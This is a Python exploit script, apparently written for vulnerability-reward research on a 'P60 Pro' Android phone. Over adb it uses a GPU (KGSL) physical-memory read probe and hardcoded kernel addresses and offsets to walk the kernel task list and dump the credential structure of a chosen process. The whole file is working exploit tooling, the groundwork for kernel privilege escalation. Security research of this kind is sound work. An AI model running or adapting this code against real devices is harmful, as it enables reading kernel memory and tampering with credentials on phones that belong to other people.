#!/usr/bin/env python3
"""Read-only walk of this P60 Pro's live task list via the GPU copy probe."""
import os
import struct
import subprocess
import sys
from pathlib import Path

SERIAL = os.environ.get("P60_ADB_SERIAL")
INIT_TASK_NEXT = Path(__file__).resolve().parents[1] / "device/init_task_next.bin"
KERNEL_PA_BASE = 0xA8000000
INIT_TASK_PA = 0xAA75B100
INIT_TASK_VA = 0xFFFFFFEDF395B100
DIRECT_VA_BASE = 0xFFFFFF8000000000
DIRECT_PA_BASE = 0x80000000
CHUNK = 0x40000
TASKS_OFF = 0x4E0
PID_OFF = 0x5E0
CRED_OFF = 0x798
COMM_OFF = 0x7B0


def u64(data: bytes, offset: int) -> int:
    return struct.unpack_from("<Q", data, offset)[0]


def u32(data: bytes, offset: int) -> int:
    return struct.unpack_from("<I", data, offset)[0]


def direct_pa(virtual_address: int) -> int:
    if not DIRECT_VA_BASE <= virtual_address < 0xFFFFFFC000000000:
        raise ValueError(f"task pointer outside direct map: {virtual_address:#x}")
    return DIRECT_PA_BASE + virtual_address - DIRECT_VA_BASE


cache: dict[int, bytes] = {}


def fetch_chunk(physical_base: int) -> bytes:
    if not SERIAL:
        raise RuntimeError("P60_ADB_SERIAL is required for device operations")
    if physical_base in cache:
        return cache[physical_base]
    command = (
        f"P60_SOURCE_PA={physical_base:#x} "
        "/data/local/tmp/p60_vrp_kgsl_phys_probe 0 >/dev/null && "
        "cat /data/local/tmp/p60_phys_probe.bin"
    )
    result = subprocess.run(
        ["adb", "-s", SERIAL, "exec-out", "sh", "-c", command],
        capture_output=True,
        check=False,
        timeout=30,
    )
    if result.returncode or len(result.stdout) != CHUNK:
        raise RuntimeError(
            f"GPU read {physical_base:#x} failed: status={result.returncode} "
            f"bytes={len(result.stdout)} stderr={result.stderr[:200]!r}"
        )
    cache[physical_base] = result.stdout
    return result.stdout


def read_physical(address: int, length: int) -> bytes:
    output = bytearray()
    while length:
        chunk_base = address & ~(CHUNK - 1)
        offset = address - chunk_base
        amount = min(length, CHUNK - offset)
        output += fetch_chunk(chunk_base)[offset : offset + amount]
        address += amount
        length -= amount
    return bytes(output)


def main() -> int:
    if len(sys.argv) != 2:
        print("usage: task_walk.py <stable-adb-shell-pid>", file=sys.stderr)
        return 2
    target_pid = int(sys.argv[1], 10)
    first_pointer = INIT_TASK_NEXT.read_bytes()
    if len(first_pointer) != 8:
        raise RuntimeError("init_task_next.bin must contain exactly one 64-bit pointer")
    head = INIT_TASK_VA + TASKS_OFF
    next_node = u64(first_pointer, 0)
    print(f"head={head:#x} first={next_node:#x} target_pid={target_pid}", flush=True)
    seen = set()
    for index in range(2000):
        if next_node == head:
            print(f"end of list after {index} tasks; {len(cache)} chunks", flush=True)
            return 1
        if next_node in seen:
            raise RuntimeError(f"task list cycle at {next_node:#x}")
        seen.add(next_node)
        task_va = next_node - TASKS_OFF
        task_pa = direct_pa(task_va)
        task = read_physical(task_pa, 0x800)
        pid = u32(task, PID_OFF)
        comm = task[COMM_OFF : COMM_OFF + 16].split(b"\0", 1)[0]
        if index % 25 == 0:
            print(f"task {index}: pid={pid} comm={comm!r} chunks={len(cache)}", flush=True)
        if pid == target_pid:
            real_cred_va = u64(task, CRED_OFF)
            cred_va = u64(task, CRED_OFF + 8)
            cred_pa = direct_pa(cred_va)
            cred = read_physical(cred_pa, 0x80)
            print(
                f"FOUND pid={pid} comm={comm!r} task_va={task_va:#x} "
                f"task_pa={task_pa:#x} real_cred_va={real_cred_va:#x} "
                f"cred_va={cred_va:#x} cred_pa={cred_pa:#x} usage={u32(cred, 0)}",
                flush=True,
            )
            print(f"cred_first_128={cred.hex()}", flush=True)
            return 0
        next_node = u64(task, TASKS_OFF)
    raise RuntimeError("task walk exceeded 2000 nodes")


if __name__ == "__main__":
    raise SystemExit(main())
